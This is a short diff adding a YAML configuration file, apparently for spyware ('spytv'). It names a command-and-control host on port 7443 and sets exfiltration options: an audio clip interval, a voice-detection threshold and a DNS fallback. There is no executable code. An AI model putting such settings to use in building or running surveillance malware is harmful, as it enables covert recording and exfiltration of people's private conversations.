@@ -1,0 +1,13 @@
+c2:
+  host: "https://C4-FORGE-HOST:7443"
+  port: 7443
+  ssl: true
+
+exfil:
+  clip_interval_ms: 300000
+  vad_threshold: 0.02
+  dns_fallback_enabled: true
+
+logging:
+  level: "INFO"
+  file: "logs/spytv.log"
